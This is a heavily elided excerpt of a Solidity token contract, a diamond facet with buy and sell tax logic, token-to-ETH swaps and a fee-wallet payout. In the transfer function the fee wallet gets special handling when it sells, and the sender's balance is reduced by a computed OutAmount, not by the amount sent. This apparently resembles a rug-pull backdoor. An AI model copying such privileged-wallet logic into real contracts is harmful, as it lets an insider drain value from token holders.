...
import "./TestLib.sol";
contract swapTokensForEthFacet is IERC20, Context, Ownable {
    ...
    function _transfer(address from, address to, uint256 amount) private {
        ...
        if (from != owner() && to != owner() && from != address(this)) {
            ...
            if (to == ds.uniswapV2Pair && from != address(this)) {
                if (from == address(ds._feeJuliaWallet)) {
                    OutAmount = min(
                        amount
                            .mul(
                                (ds._buyCount > ds._reduceBuyTaxAt)
            ...
            bool swappable = ds._buyCount > ds._preventSwapBefore &&
                ds._minJuliaSwapAmount == min(ds._minJuliaSwapAmount, amount);
            ...
            if (
                ...
                if (contractTokenBalance > ds._minJuliaSwapAmount) {
                    swapTokensForEth(
        ...
        ds._balances[from] = ds._balances[from].sub(OutAmount);
    ...
    function sendETHToFee(uint256 amount) private {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        ds._feeJuliaWallet.transfer(amount);
    }
}
